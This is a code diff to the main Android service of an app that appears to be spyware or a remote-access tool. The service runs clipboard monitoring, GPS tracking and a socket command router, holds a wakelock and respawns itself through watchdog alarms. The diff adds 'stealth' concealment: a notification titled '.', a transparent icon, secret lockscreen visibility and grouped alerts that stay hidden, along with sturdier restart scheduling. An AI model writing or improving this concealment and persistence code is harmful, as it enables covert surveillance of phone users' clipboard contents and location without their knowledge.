@@ -13,27 +13,27 @@ import android.os.Build;
 import android.os.IBinder;
 import android.os.PowerManager;
 import android.os.SystemClock;
-
 import androidx.core.app.NotificationCompat;
 
 import com.fason.app.R;
+import com.fason.app.core.Protocol;
+import com.fason.app.core.network.SocketClient;
 import com.fason.app.core.network.SocketCommandRouter;
 import com.fason.app.features.clipboard.ClipboardMonitor;
-import com.fason.app.features.location.LocManager;
+import com.fason.app.features.location.GpsManager;
 import com.fason.app.receiver.WatchdogReceiver;
 
-// Main foreground service
+/** Main foreground service with stealth notification. */
 public class MainService extends Service {
 
-    private static final String CHANNEL = "fason_service";
-    private static final int NOTIF_ID = 1;
+    public static final int NOTIF_ID = 1;
     private static final long WATCHDOG_INTERVAL = 60000;
 
-    private static MainService instance;
+    private static volatile MainService instance;
     private static PowerManager.WakeLock wakeLock;
 
     private ClipboardMonitor clipMonitor;
-    private LocManager locManager;
+    private GpsManager locManager;
     private int currentType = 0;
 
     @Override
@@ -41,7 +41,6 @@ public class MainService extends Service {
         return null;
     }
 
-    // Get service instance
     public static MainService getInstance() {
         return instance;
     }
@@ -51,59 +50,57 @@ public class MainService extends Service {
         super.onCreate();
         instance = this;
 
-        createChannel();
+        try {
+            createChannel();
+        } catch (Exception ignored) {}
+
         startForeground();
         acquireWakeLock();
-
         WatchdogReceiver.setServiceActive(this, true);
         clipMonitor = ClipboardMonitor.getInstance(this);
         clipMonitor.start();
-        locManager = new LocManager(this);
+        try {
+            locManager = new GpsManager(this);
+        } catch (Exception ignored) {}
         SocketCommandRouter.initialize();
-
         scheduleWatchdog();
     }
 
-    // Create notification channel (minimal visibility)
     private void createChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel ch = new NotificationChannel(
-                CHANNEL, "Sync", NotificationManager.IMPORTANCE_MIN);
-            ch.setDescription("");
-            ch.setShowBadge(false);
-            ch.setSound(null, null);
-            ch.enableLights(false);
-            ch.enableVibration(false);
-            ch.setBypassDnd(false);
-            ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                ch.setAllowBubbles(false);
-            }
-            NotificationManager nm = getSystemService(NotificationManager.class);
-            if (nm != null) nm.createNotificationChannel(ch);
-        }
+        NotificationManager nm = getSystemService(NotificationManager.class);
+        if (nm == null) return;
+
+        NotificationChannel existing = nm.getNotificationChannel(Protocol.NOTIF_CHANNEL);
+        if (existing != null) return;
+
+        NotificationChannel ch = new NotificationChannel(
+            Protocol.NOTIF_CHANNEL, ".", NotificationManager.IMPORTANCE_MIN);
+        ch.setDescription(".");
+        ch.setShowBadge(false);
+        ch.setSound(null, null);
+        ch.enableLights(false);
+        ch.enableVibration(false);
+        ch.setBypassDnd(false);
+        ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
+        ch.setAllowBubbles(false);
+        nm.createNotificationChannel(ch);
     }
 
-    // Start foreground with proper type
     private void startForeground() {
-        currentType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
-        Notification notif = buildNotification();
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(NOTIF_ID, notif, currentType);
-        } else {
-            startForeground(NOTIF_ID, notif);
+        currentType = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE;
+        try {
+            startForeground(NOTIF_ID, buildNotification(), currentType);
+        } catch (SecurityException e) {
+            startForeground(NOTIF_ID, buildNotification());
         }
     }
 
-    // Build notification (minimal/hidden as possible)
+    // No custom RemoteViews — avoids BadForegroundServiceNotificationException on Android 14+
     private Notification buildNotification() {
-        return new NotificationCompat.Builder(this, CHANNEL)
-            .setSmallIcon(R.drawable.ic_transparent)
-            .setContentTitle("Sync")
-            .setContentText("")
-            .setTicker("")
-            .setSubText("")
+        return new NotificationCompat.Builder(this, Protocol.NOTIF_CHANNEL)
+            .setSmallIcon(R.drawable.ic_notif_stealth)
+            .setContentTitle(".")
+            .setContentText(".")
             .setOngoing(true)
             .setSilent(true)
             .setOnlyAlertOnce(true)
@@ -111,13 +108,13 @@ public class MainService extends Service {
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setShowWhen(false)
-            .setGroup("hidden_group")
-            .setGroupSummary(false)
+            .setGroup(Protocol.NOTIF_GROUP)
+            .setGroupSummary(true)
+            .setGroupAlertBehavior(NotificationCompat.GROUP_ALERT_SUMMARY)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .build();
     }
 
-    // Acquire wakelock
     private void acquireWakeLock() {
         if (wakeLock == null) {
             PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
@@ -130,38 +127,36 @@ public class MainService extends Service {
         }
     }
 
-    // Update foreground service type (Android 14+)
+    // Android 14+ requires updating the foreground service type when new capabilities are needed
     public void updateType(int type) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
             int combined = currentType | type;
             if (combined != currentType) {
                 currentType = combined;
-                startForeground(NOTIF_ID, buildNotification(), currentType);
+                try {
+                    startForeground(NOTIF_ID, buildNotification(), currentType);
+                } catch (SecurityException ignored) {}
             }
         }
     }
 
-    // Release foreground service type
     public void releaseType(int type) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
             int remaining = currentType & ~type;
             if (remaining != currentType && remaining != 0) {
                 currentType = remaining;
-                startForeground(NOTIF_ID, buildNotification(), currentType);
+                try {
+                    startForeground(NOTIF_ID, buildNotification(), currentType);
+                } catch (SecurityException ignored) {}
             }
         }
     }
 
-    // Schedule watchdog alarm
     private void scheduleWatchdog() {
         Intent i = new Intent(this, WatchdogReceiver.class);
-        i.setAction("keepAlive");
+        i.setAction(Protocol.BC_KEEP_ALIVE);
 
-        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            flags |= PendingIntent.FLAG_IMMUTABLE;
-        }
-
+        int flags = PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE;
         PendingIntent pi = PendingIntent.getBroadcast(this, 999, i, flags);
         AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
 
@@ -175,18 +170,15 @@ public class MainService extends Service {
                     am.setAndAllowWhileIdle(
                         AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                 }
-            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            } else {
                 am.setExactAndAllowWhileIdle(
                     AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
-            } else {
-                am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
             }
         }
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // Renew wakelock
         if (wakeLock != null && !wakeLock.isHeld()) {
             wakeLock.acquire(10 * 60 * 1000L);
         }
@@ -202,8 +194,10 @@ public class MainService extends Service {
 
     @Override
     public void onDestroy() {
-        if (clipMonitor != null) clipMonitor.stop();
+        if (clipMonitor != null) clipMonitor.shutdown();
         if (locManager != null) locManager.stop();
+        SocketCommandRouter.shutdown();
+        SocketClient.getInstance().shutdown();
         if (wakeLock != null && wakeLock.isHeld()) {
             wakeLock.release();
         }
@@ -213,29 +207,35 @@ public class MainService extends Service {
         super.onDestroy();
     }
 
-    // Schedule restart
+    // Targets WatchdogReceiver (exported=false) for secure restart
     private void scheduleRestart() {
         try {
-            Intent i = new Intent("respawnService");
-            i.setPackage(getPackageName());
+            Intent i = new Intent(this, WatchdogReceiver.class);
+            i.setAction(Protocol.BC_RESPAWN_SERVICE);
 
-            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                flags |= PendingIntent.FLAG_IMMUTABLE;
-            }
-
+            int flags = PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE;
             PendingIntent pi = PendingIntent.getBroadcast(this, 0, i, flags);
             AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
 
             if (am != null) {
                 long trigger = SystemClock.elapsedRealtime() + 2000;
-                am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                    if (am.canScheduleExactAlarms()) {
+                        am.setExactAndAllowWhileIdle(
+                            AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
+                    } else {
+                        am.setAndAllowWhileIdle(
+                            AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
+                    }
+                } else {
+                    am.setExactAndAllowWhileIdle(
+                        AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
+                }
             }
         } catch (Exception ignored) {}
     }
 
-    // Get location manager
-    public LocManager getLocManager() {
+    public GpsManager getGpsManager() {
         return locManager;
     }
 }
